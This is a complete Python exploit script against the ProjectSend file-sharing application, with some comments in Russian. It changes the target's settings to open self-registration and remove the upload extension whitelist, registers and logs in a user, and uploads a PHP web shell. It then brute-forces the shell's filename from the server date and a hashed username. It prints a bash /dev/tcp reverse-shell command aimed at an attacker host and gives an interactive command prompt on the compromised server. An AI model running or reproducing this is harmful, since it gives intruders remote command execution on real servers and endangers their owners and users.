#!/usr/bin/env python3
"""
ProjectSend Exploit Script
Usage: python3 exploit.py <target_url> [username] [password] [email]
"""

import re
import sys
import time
import hashlib
import subprocess
import requests
from datetime import datetime, timezone
from email.utils import parsedate_to_datetime
from urllib.parse import quote

# Отключаем предупреждения SSL
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def get_csrf_token(session, url):
    resp = session.get(url, verify=False)
    match = re.search(r'name="csrf_token"\s+value="([^"]+)"', resp.text)
    if match:
        print(f'[+] csrf token FOUND\n{match.group(1)}')
        return match.group(1)
    else:
        print(f'[-] csrf NOT token found')
        return None

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 exploit.py <target_url> [username] [password] [email] [attacker_ip] [attacker_port]")
        sys.exit(1)
    
    TARGET = sys.argv[1].rstrip('/')
    USERNAME = sys.argv[2] if len(sys.argv) > 2 else "username1"
    PASSWORD = sys.argv[3] if len(sys.argv) > 3 else "passw0rd1"
    EMAIL = sys.argv[4] if len(sys.argv) > 4 else f"{USERNAME}@pipeline.stf"
    ATTACKER_IP = sys.argv[5] if len(sys.argv) > 5 else "192.168.0.1"
    ATTACKER_PORT = sys.argv[6] if len(sys.argv) > 6 else "4444"
    SHELL_FILENAME = "shell.phtml"
    
    print(f"[*] Target: {TARGET}")
    print(f"[*] Credentials: {USERNAME} / {PASSWORD}")
    print(f"[*] E-mail: {EMAIL}")
    
    session = requests.Session()
    
    # Устанавливаем заголовки, как в примере
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'Upgrade-Insecure-Requests': '1',
        'Connection': 'keep-alive'
    })
    
    print('[*] STEP 1. Getting csrf token...')
    if not (csrf := get_csrf_token(session, f"{TARGET}/index.php")):
        sys.exit(1)
    print()

    print("[*] STEP 2: Open user registration ...")
    session.post(f"{TARGET}/options.php",data={
        "csrf_token": csrf,
        "section": "clients",
        "clients_can_register": "1",
        "clients_auto_approve": "1",
        "clients_can_upload": "1",
        "clients_can_delete_own_files": "1"
    }, verify=False)
    print()
    
    print(f"[*] STEP 3: register user {USERNAME} ...")
    resp = session.post(f"{TARGET}/register.php", data={
        "csrf_token": csrf,
        "name": "Raymond Bright",
        "username": USERNAME,
        "password": PASSWORD,
        "email": EMAIL,
        "address": "n_a",
        "phone": "n_a"
    }, verify=False, allow_redirects=True)
    print()
    
    print(f"[*] STEP 4: Authorization username: {USERNAME} password: {PASSWORD} ...")
    resp = session.post(f"{TARGET}/index.php", data={
        "csrf_token": csrf,
        "do": "login",
        "username": USERNAME,
        "password": PASSWORD
    }, verify=False, allow_redirects=True)
    print()

    print("[*] STEP 5: Turn OFF extension whitelist ...")
    resp=session.post(f"{TARGET}/options.php", data={
        "csrf_token": csrf,
        "section": "security",
        "file_types_limit_to": "noone"
    }, verify=False)
    print()
    
    print("[*] STEP 6: Upload web-shell ...")
    shell_content = '<?php system($_GET["cmd"]); ?>'
    files = {
        'name': (None, 'shell.phtml'),  # (filename, content, content_type)
        'file': ('blob', shell_content, 'application/octet-stream')
    }

    resp = session.post(
        f"{TARGET}/includes/upload.process.php",
        files=files,
        verify=False
    )
    if '"OK":1' not in resp.text:
        print(f"[-] Ошибка загрузки: {resp.text}")
        sys.exit(1)
    print("[+] File uploaded successfully!")
    print()
    
    print("[*] STEP 7: Looking 4 web-shell ...")
    print("[*] Get server date ...")
    server_date = resp.headers.get('Date')
    print(f"[+] Server Date: {server_date}")
    print()
    
    print("[*] STEP 7: Calculate uploaded web-shell path ...")
    try:
        dt = parsedate_to_datetime(server_date)
        base_ts = int(dt.timestamp())
    except:
        print("[-] Something wrong with server date. EXIT.")
        sys.exit(1)
    
    sha_user = hashlib.sha1(USERNAME.encode()).hexdigest()
    found_url = None
    print('[!] Filename = (server_date_in_unix_time)-(sha_from_username)-(shell_filename)')    
    for offset in range(-12, 15):
        ts = base_ts + offset * 3600
        url = f"{TARGET}/upload/files/{ts}-{sha_user}-{SHELL_FILENAME}"
        try:
            test_resp = session.get(f"{url}?cmd=id", verify=False, timeout=5)
            if test_resp.status_code == 200 and 'uid=' in test_resp.text:
                print(f"[+] FOUND! offset={offset}")
                found_url = url
                print(f"[+] Shell URL: {found_url}")
                print(f"[+] Test output: {test_resp.text.strip()}")
                break
        except:
            continue
    
    if not found_url:
        print("[-] File NOT found. Something wrong. EXIT.")
        sys.exit(1)
    
    print(f"[+] Pwn3d!!! Shell URL:\n{found_url}")
    print(f"[*] Working revshell: bash -c 'bash -i >& /dev/tcp/{ATTACKER_IP}/{ATTACKER_PORT} 0>&1'")
    print()
    
    print("[i] Interactive shell (type 'exit' 4 exit):")
    while True:
        cmd = input("[cmd]> ").strip()
        if cmd.lower() in ('exit', 'quit', 'q'):
            break
        if not cmd:
            continue

        enc_cmd = quote(cmd, safe='')
        try:
            resp = session.get(f"{found_url}?cmd={enc_cmd}", verify=False, timeout=10)
            print(resp.text)
        except Exception as e:
            print(f"[-] Error: {e}")

if __name__ == "__main__":
    main()